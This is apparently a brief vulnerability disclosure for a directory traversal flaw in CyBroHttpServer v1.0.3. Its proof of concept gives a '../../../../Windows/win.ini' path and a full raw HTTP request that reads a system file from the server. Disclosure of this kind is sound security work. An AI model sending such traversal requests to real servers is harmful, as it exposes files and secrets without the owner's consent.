# CyBroHttpServer-v1.0.3-Directory-Traversal
Directory Traversal in CyBroHttpServer v1.0.3 allows an attacker to read sensitive informations.

# PoC
To exploit vulnerability, someone could use 'http://[host]/../../../../' request to get some informations from the target. 
  For example: http://[host]/../../../../Windows/win.ini'


```
GET /../../../../Windows/win.ini HTTP/1.1
Host: 192.168.43.102:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

![alt tag](https://www.emreovunc.com/blog/en/CyBroHttpServer-v.1.0.3-Directory-Traversal-1.png)

![alt tag](https://www.emreovunc.com/blog/en/CyBroHttpServer-v.1.0.3-Directory-Traversal-2.png)
